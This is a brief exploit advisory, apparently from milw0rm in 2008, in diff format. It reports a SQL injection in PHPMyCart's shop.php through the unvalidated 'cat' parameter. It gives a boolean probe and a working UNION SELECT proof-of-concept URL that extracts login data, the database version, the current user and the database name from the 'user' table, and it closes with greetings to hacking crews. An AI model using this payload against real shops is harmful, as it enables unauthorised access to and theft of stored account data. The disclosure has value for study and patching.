@@ -1,0 +1,35 @@
+######################
+#
+#PHPMyCart Injection Vulnerability
+#
+######################
+#
+#Bug by: h0yt3r
+#
+##
+###
+##
+#
+#Script suffers from a not correctly verified category id variable which is used in SQL Querys.
+#An Attacker can easily get sensitive information from the database by
+#injecting unexpected SQL Querys.
+#
+#We dont get any SQL Errors when the Injection Query appear to be false.
+#However we have to look for content changing when we inject.
+#Look at AND 1=1/AND 1=0
+#All rows are echoed on the left side.
+#
+#SQL Injection:
+#http://[target]/[path]/shop.php?cat=[SQL]
+#
+#PoC:
+#shop.php?cat=2%20and%201=0%20union%20select%201,concat(name,0x3a,login,0x3a,@@VERSION,0x3a,user(),0x3a,database())%20from%20user
+#
+#######################
+#
+#Greetz to b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the neverdying h4ck-y0u Team!
+#
+#######################
+####################### 
+
+# milw0rm.com [2008-06-14]
